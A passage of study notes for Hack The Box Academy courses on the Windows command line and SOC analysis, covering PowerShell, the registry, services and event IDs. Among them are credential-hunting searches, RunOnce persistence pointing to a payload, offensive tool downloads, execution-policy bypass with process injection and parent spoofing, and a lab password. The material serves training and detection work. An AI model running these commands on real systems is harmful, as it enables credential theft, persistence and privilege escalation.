Create new objects. ( can be files, folders, symlinks, registry entries, and more) Set-Item si Modify the property values of an object. Copy-Item copy / cp / ci Make a duplicate of the item. Rename-Item ren / rni Changes the object name. Remove-Item rm / del / rmdir Deletes the object. Get-Content cat / type Displays the content within a file or object. Add-Content ac Append content to a file. Set-Content sc overwrite any content in a file with new data. Clear-Content clc Clear the content of the files without deleting the file itself. Compare-Object diff / compare Compare two or more objects against each other. This includes the object itself and the content within. <pre><code>Get-Location\n\nnew-item -name \"SOPs\" -type directory\n\ncd SOPs \n\nmkdir \"Physical Sec\"\nmkdir \"Cyber Sec\"\nmkdir \"Training\"\n\nGet-ChildItem \n\nnew-Item \"Readme.md\" -ItemType File\n\ncd '.\\Physical Sec\\'\n\nnew-Item \"Physical-Sec-draft.md\" -ItemType File\n\ncd ..\ncd '.\\Cyber Sec\\'\n\nnew-Item \"Cyber-Sec-draft.md\" -ItemType File\n\ncd ..\ncd .\\Training\\\n\nnew-Item \"Employee-Training-draft.md\" -ItemType File\n\ncd ..\ntree /F\n\nAdd-Content .\\Readme.md \"Title: Insert Document Title Here\n&gt;&gt; Date: x/x/202x\n&gt;&gt; Author: MTanaka\n&gt;&gt; Version: 0.1 (Draft)\"  \n\nRename-Item .\\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md\n\nget-childitem -Path *.txt | rename-item -NewName {$_.name -replace \".txt\",\".md\"}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#finding-filtering-content", "title": "Finding &amp; Filtering Content", "text": "<pre><code>Get-LocalUser administrator | get-member\n\nGet-LocalUser administrator | Select-Object -Property *\n\nGet-LocalUser * | Select-Object -Property Name,PasswordLastSet\n\nGet-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled\n\nGet-Service | Select-Object -Property *\n\n# fl: format output into list\nget-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl \n\nGet-Service | where DisplayName -like '*Defender*'\n</code></pre> <p>Comparison Operators</p> Expression Description Like Like utilizes wildcard expressions to perform matching. For example, 'Defender' would match anything with the word Defender somewhere in the value. Contains Contains will get the object if any item in the property value matches exactly as specified. Equal to Specifies an exact match (case sensitive) to the property value supplied. Match Is a regular expression match to the value supplied. Not specifies a match if the property is <code>blank</code> or does not exist. It will also match <code>$False</code>. <pre><code>Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *\n\n# Using the Pipeline to Count Unique Instances\nget-process | sort | unique | measure-object\n\nGet-ChildItem -Path C:\\Users\\MTanaka\\ -File -Recurse \n\nGet-Childitem \u2013Path C:\\Users\\MTanaka\\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \"*.txt\")}\n\nGet-Childitem \u2013Path C:\\Users\\MTanaka\\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \"*.txt\" -or $_.Name -like \"*.py\" -or $_.Name -like \"*.ps1\" -or $_.Name -like \"*.md\" -or $_.Name -like \"*.csv\")}\n\n# sls: Select-string is not case sensitive by default\nGet-ChildItem -Path C:\\Users\\MTanaka\\ -Filter \"*.txt\" -Recurse -File | sls \"Password\",\"credential\",\"key\"\n\nGet-Childitem \u2013Path C:\\Users\\MTanaka\\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like \"*.txt\" -or $_. Name -like \"*.py\" -or $_. Name -like \"*.ps1\" -or $_. Name -like \"*.md\" -or $_. Name -like \"*.csv\")} | sls \"Password\",\"credential\",\"key\",\"UserName\"\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-services", "title": "Working with Services", "text": "<pre><code>Get-Help *-Service\n\nGet-Service | ft DisplayName,Status \n\nGet-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status\n\nStart-Service WinDefend\n\nget-service WinDefend\n\nget-service \n\nStop-Service Spooler \n\nGet-Service Spooler \n\nget-service spooler | Select-Object -Property Name, StartType, Status, DisplayName\n\nSet-Service -Name Spooler -StartType Disabled\n\nGet-Service -Name Spooler | Select-Object -Property StartType\n\nget-service -ComputerName ACADEMY-ICL-DC\n\nGet-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq \"Running\"}\n\n# We are telling PowerShell that we want to run a command on a local or remote computer\ninvoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-the-registry", "title": "Working with the Registry", "text": "<pre><code># Root Registry Keys\nGet-ChildItem C:\\Windows\\System32\\config\\\n</code></pre> <p>Hive Breakdown |Name   |Abbreviation   |Description | |-------|---------------|------------| |HKEY_LOCAL_MACHINE |HKLM   |This subtree contains information about the computer's physical state, such as hardware and operating system data, bus types, memory, device drivers, and more. | |HKEY_CURRENT_CONFIG    |HKCC   |This section contains records for the host's current hardware profile. (shows the variance between current and default setups) Think of this as a redirection of the HKLM CurrentControlSet profile key.| |HKEY_CLASSES_ROOT  |HKCR   |Filetype information, UI extensions, and backward compatibility settings are defined here. | |HKEY_CURRENT_USER  |HKCU   |Value entries here define the specific OS and software settings for each specific user. Roaming profile settings, including user preferences, are stored under HKCU. | |HKEY_USERS |HKU |The default User profile and current user configuration settings for the local computer are defined under HKU. |</p> <pre><code># Querying Registry Entries\nGet-Item -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | Select-Object -ExpandProperty Property\n\nGet-ChildItem -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -Recurse\n\nGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\7-Zip\n\n# Searching With Reg Query\nREG QUERY HKCU /F \"Password\" /t REG_SZ /S /K\n</code></pre> <ul> <li> <p>/f \"password\": /f sets the pattern we are searching for. In this instance, we are looking for \"Password\".</p> </li> <li> <p>/t REG_SZ: /t is setting the value type to search. If we do not specify, reg query will search through every type.</p> </li> <li> <p>/s: /s says to search through all subkeys and values recursively.</p> </li> <li> <p>/k: /k narrows it down to only searching through Key names.</p> </li> </ul> <pre><code># New Registry Key\nNew-Item -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\ -Name TestKey\n\n# Set New Registry Item Property\nNew-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\TestKey -Name  \"access\" -PropertyType String -Value \"C:\\Users\\htb-student\\Downloads\\payload.exe\"\n\n# add the same key/value pair using Reg.exe\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\TestKey\" /v access /t REG_SZ /d \"C:\\Users\\htb-student\\Downloads\\payload.exe\"\n\n# Delete Reg properties\nRemove-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\TestKey -Name  \"access\"\n\nGet-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\TestKey\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#working-with-the-windows-event-log", "title": "Working with the Windows Event Log", "text": "<p>Event Log Categories and Types</p> Log Category Log Description System Log The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup. Security Log Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules. Application Log This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log. Setup Log This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts. Forwarded Events Logs that are forwarded from other hosts within the same network. <p>Event Types</p> Type of Event Event Description Error Indicates a major problem, such as a service failing to load during startup, has occurred. Warning A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data. Information Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each time they start, as this could lead to a considerable amount of extra \"noise\" in the logs. Success Audit Recorded when an audited security access attempt is successful, such as when a user logs on to a system. Failure Audit Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying. <p>Event Severity Levels</p> Severity Level Level # Description Verbose 5 Progress or success messages. Information 4 An event that occurred on the system but did not cause any issues. Warning 3 A potential problem that a sysadmin should dig into. Error 2 An issue related to the system or service that does not require immediate attention. Critical 1 This indicates a significant issue related to an application or a system that requires urgent attention by a sysadmin that, if not addressed, could lead to system or application instability. <pre><code>ls C:\\Windows\\System32\\winevt\\logs\n\nwevtutil /?\n\n# Enumerating Log Sources\nwevtutil el\n\n# Gathering Log Information\nwevtutil gl \"Windows PowerShell\"\n\nwevtutil gli \"Windows PowerShell\"\n\n# Querying Events\nwevtutil qe Security /c:5 /rd:true /f:text\n\n# Exporting Events\nwevtutil epl System C:\\system_export.evtx\n</code></pre> <pre><code># PowerShell - Listing All Logs\nGet-WinEvent -ListLog *\n\n# Security Log Details\nGet-WinEvent -ListLog Security\n\n# Querying Last Five Events\nGet-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message\n\n# Filtering for Logon Failures\nGet-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}\n\nGet-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#networking-management-from-the-cli", "title": "Networking Management from The CLI", "text": "Protocol Description SMB SMB provides Windows hosts with the capability to share resources, files, and a standard way of authenticating between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option. Netbios NetBios itself isn't directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism when DNS fails. Can also be known as NBT-NS (NetBIOS name service). LDAP LDAP is an open-source cross-platform protocol used for authentication and authorization with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as Active Directory. LLMNR LLMNR provides a name resolution service based on DNS and works if DNS is not available or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links). DNS DNS is a common naming standard used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by \"WWW.google.com\" instead of \"8.8.8.8\". Internally this is how we request resources and access from a network. HTTP/HTTPS HTTP/S HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as web servers, send and receive data from remote sources, and much more. Kerberos Kerberos is a network level authentication protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources. WinRM WinRM Is an implementation of the WS-Management protocol. It can be used to manage the hardware and software functionalities of hosts. It is mainly used in IT administration but can also be used for host enumeration and as a scripting engine. RDP RDP is a Windows implementation of a network UI services protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host. SSH SSH is a secure protocol that can be used for secure host access, transfer of files, and general communication between network hosts. It provides a way to securely access hosts and services over insecure networks. <p>Querying Networking Settings</p> <pre><code>ipconfig \nipconfig /all \n\n# ARP is a protocol utilized to translate IP addresses to Physical addresses.\narp -a\n\nnslookup ACADEMY-ICL-DC\n\nnetstat -an \n</code></pre> <p>PowerShell Net Cmdlets</p> Cmdlet Description Get-NetIPInterface Retrieve all visible network adapter properties. Get-NetIPAddress Retrieves the IP configurations of each adapter.  Similar to IPConfig. Get-NetNeighbor Retrieves the neighbor entries from the cache. Similar to arp -a. Get-Netroute Will print the current route table. Similar to IPRoute. Set-NetAdapter Set basic adapter properties at the Layer-2 level such as VLAN id, description, and MAC-Address. Set-NetIPInterface Modifies the settings of an interface to include DHCP status, MTU, and other metrics. New-NetIPAddress Creates and configures an IP address. Set-NetIPAddress Modifies the configuration of a network adapter. Disable-NetAdapter Used to disable network adapter interfaces. Enable-NetAdapter Used to turn network adapters back on and allow network connections. Restart-NetAdapter Used to restart an adapter. It can be useful to help push changes made to adapter settings. test-NetConnection Allows for diagnostic checks to be ran on a connection. It supports ping, tcp, route tracing, and more. <pre><code>Get-NetIPAddress -ifIndex 25\n\nSet-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled\n\nSet-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24\n\nGet-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength\n\nGet-NetIPinterface -ifindex 20 | ft ifIndex,InterfaceAlias,Dhcp\n\nRestart-NetAdapter -Name 'Ethernet 3'\n\nTest-NetConnection\n</code></pre> <p>Setting up SSH on a Windows Target</p> <pre><code>Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n\nAdd-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0\n\nGet-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n\nAdd-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n\nGet-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n\nStart-Service sshd  \n\nSet-Service -Name sshd -StartupType 'Automatic' \n</code></pre> <p>Enabling WinRM</p> <pre><code>winrm quickconfig\n\n# Testing Unauthenticated Access\nTest-WSMan -ComputerName \"10.129.224.248\"\n\n# Testing Authenticated Access\nTest-WSMan -ComputerName \"10.129.224.248\" -Authentication Negotiate\n</code></pre> <p>PowerShell Remote Sessions</p> <p>Enter-PSSession</p> <pre><code># Establishing a PowerShell Session\nEnter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate\n\n$PSVersionTable \n\n# Using Enter-PSSession from Linux\n$ [PS]&gt; Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate\n\n$PSVersionTable\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#interacting-with-the-web", "title": "Interacting With The Web", "text": "<pre><code>Get-Help Invoke-Webrequest\n\nInvoke-WebRequest -Uri \"https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html\" -Method GET | Get-Member\n\n# Filtering Incoming Content\nInvoke-WebRequest -Uri \"https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html\" -Method GET | fl Images\n\n# Raw Content\nInvoke-WebRequest -Uri \"https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html\" -Method GET | fl RawContent\n\n# Download To Our Host\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\" -OutFile \"C:\\PowerView.ps1\"\n\n# If We Can't Use Invoke-WebRequest\n(New-Object Net.WebClient).DownloadFile(\"https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip\", \"Bloodhound.zip\")\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#powershell-scripting-and-automation", "title": "PowerShell Scripting and Automation", "text": "<p>PowerShell Extensions</p> Extension Description ps1 The *.ps1 file extension represents executable PowerShell scripts. psm1 The *.psm1 file extension represents a PowerShell module file. It defines what the module is and what is contained within it. psd1 The *.psd1 is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs. <pre><code>PS C:\\htb&gt; New-ModuleManifest -Path C:\\Users\\MTanaka\\Documents\\WindowsPowerShell\\Modules\\quick-recon\\quick-recon.psd1 -PassThru\n\n# Module manifest for module 'quick-recon'\n#\n# Generated by: MTanaka\n#\n# Generated on: 10/31/2022\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\n# RootModule = ''\n\n# Version number of this module.\nModuleVersion = '1.0'\n\n&lt;SNIP&gt;\n</code></pre> <p>Sample Manifest</p> <pre><code># Module manifest for module 'quick-recon'\n#\n# Generated by: MTanaka\n#\n# Generated on: 10/31/2022\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\n# RootModule = 'C:\\Users\\MTanaka\\WindowsPowerShell\\Modules\\quick-recon\\quick-recon.psm1'\n\n# Version number of this module.\nModuleVersion = '1.0'\n\n# ID used to uniquely identify this module\nGUID = '0a062bb1-8a1b-4bdb-86ed-5adbe1071d2f'\n\n# Author of this module\nAuthor = 'MTanaka'\n\n# Company or vendor of this module\nCompanyName = 'Greenhorn.Corp.'\n\n# Copyright statement for this module\nCopyright = '(c) 2022 Greenhorn.Corp. All rights reserved.'\n\n# Description of the functionality provided by this module\nDescription = 'This module will perform several quick checks against the host for Reconnaissance of key information.'\n\n# Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.\nFunctionsToExport = @()\n\n# Cmdlets to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no cmdlets to export.\nCmdletsToExport = @()\n\n# Variables to export from this module\nVariablesToExport = '*'\n\n# Aliases to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no aliases to export.\nAliasesToExport = @()\n\n# List of all modules packaged with this module\n# ModuleList = @()\n\n# List of all files packaged with this module\n# FileList = @()  \n}\n</code></pre> <p>Create Our Script File</p> <pre><code>ni quick-recon.psm1 -ItemType File\n\nNew-Item quick-recon.psm1 -ItemType File\n</code></pre> <p>Import Into Our Module</p> <pre><code>Import-Module ActiveDirectory \n\nfunction Get-Recon {  \n    # Collect the hostname of our PC.\n    $Hostname = $env:ComputerName  \n    # Collect the IP configuration.\n    $IP = ipconfig\n    # Collect basic domain information.\n    $Domain = Get-ADDomain \n    # Output the users who have logged in and built out a basic directory structure in \"C:\\Users\\\".\n    $Users = Get-ChildItem C:\\Users\\\n    # Create a new file to place our recon results in.\n    new-Item ~\\Desktop\\recon.txt -ItemType File \n    # A variable to hold the results of our other variables. \n    $Vars = \"***---Hostname info---***\", $Hostname, \"***---Domain Info---***\", $Domain, \"***---IP INFO---***\",  $IP, \"***---USERS---***\", $Users\n    # It does the thing \n    Add-Content ~\\Desktop\\recon.txt $Vars\n  } \n\n  Export-ModuleMember -Function Get-Recon -Variable Hostname \n</code></pre> <pre><code># Exclude From Export\nExport-ModuleMember \n\n# Export Specific Functions and Variables\nExport-ModuleMember -Function Get-Recon -Variable Hostname \n</code></pre> <p>Importing the Module For Use</p> <pre><code>Import-Module 'C:\\Users\\MTanaka\\Documents\\WindowsPowerShell\\Modules\\quick-recon.psm1'\n\nget-module\n\n# Help Validation\nget-help get-recon\n</code></pre>"}, {"location": "HTB/Academy/Introduction%20to%20Windows%20Command%20Line/#skill-assessment", "title": "Skill Assessment", "text": "<pre><code>Get-ChildItem -Path C:\\Users\\user4\\Documents -Filter flag.txt -Recurse | Get-Content\n\n# find the Registered Owner of the host\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v RegisteredOwner\n\nGet-ADUser -Filter {Surname -like '*Flag*'}\n\n# Use the tasklist command to print running processes and then sort them in reverse order by name.\ntasklist | sort /R\n</code></pre> <p>This script queries the Security Event Log for Event ID 4625, groups the results by the target user account, and sorts them in descending order by the number of failed logon attempts.</p> <pre><code># Query Event ID 4625 (Logon Failure) from the Security Log\n$events = Get-WinEvent -FilterHashtable @{\n    LogName = 'Security'\n    ID = 4625\n}\n\n# Group events by target user account and count the number of failures\n$failedLogons = $events | Group-Object { $_.Properties[5].Value } | Select-Object Name, Count | Sort-Object Count -Descending\n\n# Display the results\n$failedLogons | Format-Table -AutoSize\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/", "title": "SOC Analyst Pathway", "text": ""}, {"location": "HTB/Academy/SOC%20Analyst/#useful-windows-event-logs", "title": "Useful Windows Event Logs", "text": "<pre><code>$ xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:[Target IP] /dynamic-resolution\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#1-windows-system-logs", "title": "1. Windows System Logs", "text": "<p>Event ID 1074 (System Shutdown/Restart): This event log indicates when and why the system was shut down or restarted. By monitoring these events, you can determine if there are unexpected shutdowns or restarts, potentially revealing malicious activity such as malware infection or unauthorized user access.</p> <p>Event ID 6005 (The Event log service was started): This event log marks the time when the Event Log Service was started. This is an important record, as it can signify a system boot-up, providing a starting point for investigating system performance or potential security incidents around that period. It can also be used to detect unauthorized system reboots.</p> <p>Event ID 6006 (The Event log service was stopped): This event log signifies the moment when the Event Log Service was stopped. It is typically seen when the system is shutting down. Abnormal or unexpected occurrences of this event could point to intentional service disruption for covering illicit activities.</p> <p>Event ID 6013 (Windows uptime): This event occurs once a day and shows the uptime of the system in seconds. A shorter than expected uptime could mean the system has been rebooted, which could signify a potential intrusion or unauthorized activities on the system.</p> <p>Event ID 7040 (Service status change): This event indicates a change in service startup type, which could be from manual to automatic or vice versa. If a crucial service's startup type is changed, it could be a sign of system tampering.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#2-windows-security-logs", "title": "2. Windows Security Logs", "text": "<p>Event ID 1102 (The audit log was cleared): Clearing the audit log is often a sign of an attempt to remove evidence of an intrusion or malicious activity.</p> <p>Event ID 1116 (Antivirus malware detection): This event is particularly important because it logs when Defender detects a malware. A surge in these events could indicate a targeted attack or widespread malware infection. Event ID 1118 (Antivirus remediation activity has started): This event signifies that Defender has begun the process of removing or quarantining detected malware. It's important to monitor these events to ensure that remediation activities are successful.</p> <p>Event ID 1119 (Antivirus remediation activity has succeeded): This event signifies that the remediation process for detected malware has been successful. Regular monitoring of these events will help ensure that identified threats are effectively neutralized.</p> <p>Event ID 1120 (Antivirus remediation activity has failed): This event is the counterpart to 1119 and indicates that the remediation process has failed. These events should be closely monitored and addressed immediately to ensure threats are effectively neutralized.</p> <p>Event ID 4624 (Successful Logon): This event records successful logon events. This information is vital for establishing normal user behavior. Abnormal behavior, such as logon attempts at odd hours or from different locations, could signify a potential security threat.</p> <p>Event ID 4625 (Failed Logon): This event logs failed logon attempts. Multiple failed logon attempts could signify a brute-force attack in progress.</p> <p>Event ID 4648 (A logon was attempted using explicit credentials): This event is triggered when a user logs on with explicit credentials to run a program. Anomalies in these logon events could indicate lateral movement within a network, which is a common technique used by attackers.</p> <p>Event ID 4656 (A handle to an object was requested): This event is triggered when a handle to an object (like a file, registry key, or process) is requested. This can be a useful event for detecting attempts to access sensitive resources.</p> <p>Event ID 4672 (Special Privileges Assigned to a New Logon): This event is logged whenever an account logs on with super user privileges. Tracking these events helps to ensure that super user privileges are not being abused or used maliciously.</p> <p>Event ID 4698 (A scheduled task was created): This event is triggered when a scheduled task is created. Monitoring this event can help you detect persistence mechanisms, as attackers often use scheduled tasks to maintain access and run malicious code.</p> <p>Event ID 4700 &amp; Event ID 4701 (A scheduled task was enabled/disabled): This records the enabling or disabling of a scheduled task. Scheduled tasks are often manipulated by attackers for persistence or to run malicious code, thus these logs can provide valuable insight into suspicious activities.</p> <p>Event ID 4702 (A scheduled task was updated): Similar to 4698, this event is triggered when a scheduled task is updated. Monitoring these updates can help detect changes that may signify malicious intent.</p> <p>Event ID 4719 (System audit policy was changed): This event records changes to the audit policy on a computer. It could be a sign that someone is trying to cover their tracks by turning off auditing or changing what events get audited.</p> <p>Event ID 4738 (A user account was changed): This event records any changes made to user accounts, including changes to privileges, group memberships, and account settings. Unexpected account changes can be a sign of account takeover or insider threats.</p> <p>Event ID 4771 (Kerberos pre-authentication failed): This event is similar to 4625 (failed logon) but specifically for Kerberos authentication. An unusual amount of these logs could indicate an attacker attempting to brute force your Kerberos service.</p> <p>Event ID 4776 (The domain controller attempted to validate the credentials for an account): This event helps track both successful and failed attempts at credential validation by the domain controller. Multiple failures could suggest a brute-force attack.</p> <p>Event ID 5001 (Antivirus real-time protection configuration has changed): This event indicates that the real-time protection settings of Defender have been modified. Unauthorized changes could indicate an attempt to disable or undermine the functionality of Defender.</p> <p>Event ID 5140 (A network share object was accessed): This event is logged whenever a network share is accessed. This can be critical in identifying unauthorized access to network shares.</p> <p>Event ID 5142 (A network share object was added): This event signifies the creation of a new network share. Unauthorized network shares could be used to exfiltrate data or spread malware across a network.</p> <p>Event ID 5145 (A network share object was checked to see whether client can be granted desired access): This event indicates that someone attempted to access a network share. Frequent checks of this sort might indicate a user or a malware trying to map out the network shares for future exploits.</p> <p>Event ID 5157 (The Windows Filtering Platform has blocked a connection): This is logged when the Windows Filtering Platform blocks a connection attempt. This can be helpful for identifying malicious traffic on your network.</p> <p>Event ID 7045 (A service was installed in the system): A sudden appearance of unknown services might suggest malware installation, as many types of malware install themselves as services.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#windows-event-logging-basics-exercises", "title": "Windows Event Logging Basics exercises", "text": "<p>Analyze the event with ID 4624, that took place on 8/3/2022 at 10:23:25. Conduct a similar investigation as outlined in this section and provide the name of the executable responsible for the modification of the auditing settings as your answer. Answer format: T_W_____.exe</p> <p></p> <p>The point is to see what changed after the logon. After the successful logon (4624), the user conduct 4907 (Auditing settings on object were changed.)</p> <p></p> <p>Answer: TiWorker.exe</p> <p>System monitor event ID</p> <p>MD5=1F009DE6A013A282D07436241512C056,SHA256=C897C345C3BCF3E96589A0FEEEA8B6D26CF33C091AC3EE2162DD27F8A79C3FF5,IMPHASH=48D15928B7CDAE9E088E08F2C8DE7CFE Signed: true</p> <pre><code>C:\\Tools\\Sysmon&gt; sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n\n</code></pre> <pre><code>&lt;ImageLoad onmatch=\"exclude\"&gt;\n            &lt;!--NOTE: Using \"include\" with no rules means nothing in this section will be logged--&gt;\n&lt;/ImageLoad&gt;\n</code></pre> <pre><code>C:\\Tools\\Sysmon&gt; sysmon.exe -c sysmonconfig-export.xml\n</code></pre> <p>ProcessHacker</p> <pre><code>powershell -ep bypass\nImport-Module .\\Invoke-PSInject.ps1\nInvoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode \"V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi\"\n</code></pre> <pre><code>PS C:\\Tools\\psgetsystem&gt; powershell -ep bypass\nPS C:\\Tools\\psgetsystem&gt; Import-Module .\\psgetsys.ps1 \nPS C:\\Tools\\psgetsystem&gt; [MyProcess]::CreateProcessFromParent([Process ID of spoolsv.exe],\"C:\\Windows\\System32\\cmd.exe\",\"\")\n\nc:\\Tools\\SilkETW_SilkService_v8\\v8\\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\\windows\\temp\\etw.json\n\nPS C:\\Tools\\GhostPack Compiled Binaries&gt;.\\Seatbelt.exe TokenPrivileges\n\nc:\\Tools\\SilkETW_SilkService_v8\\v8\\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\\windows\\temp\\etw.json\n</code></pre> <pre><code>PS C:\\Users\\Administrator&gt; Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize\n\nPS C:\\Users\\Administrator&gt; Get-WinEvent -ListProvider * | Format-Table -AutoSize\n\n# Retrieving events from the System log\nPS C:\\Users\\Administrator&gt; Get-WinEvent -LogName 'System' -MaxEvents 50 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\n# Retrieving events from Microsoft-Windows-WinRM/Operational\nPS C:\\Users\\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\nPS C:\\Users\\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\n# Retrieving events from .evtx Files\nPS C:\\Users\\Administrator&gt; Get-WinEvent -Path 'C:\\Tools\\chainsaw\\EVTX-ATTACK-SAMPLES\\Execution\\exec_sysmon_1_lolbin_pcalua.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\n# Filtering events with FilterHashtable\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{Path='C:\\Tools\\chainsaw\\EVTX-ATTACK-SAMPLES\\Execution\\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\n# get event logs based on a date range (5/28/23 - 6/2/2023)\nPS C:\\Users\\Administrator&gt; $startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date\nPS C:\\Users\\Administrator&gt; $endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\n# Filtering events with FilterHashtable &amp; XML\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |\n`ForEach-Object {\n$xml = [xml]$_.ToXml()\n$eventData = $xml.Event.EventData.Data\nNew-Object 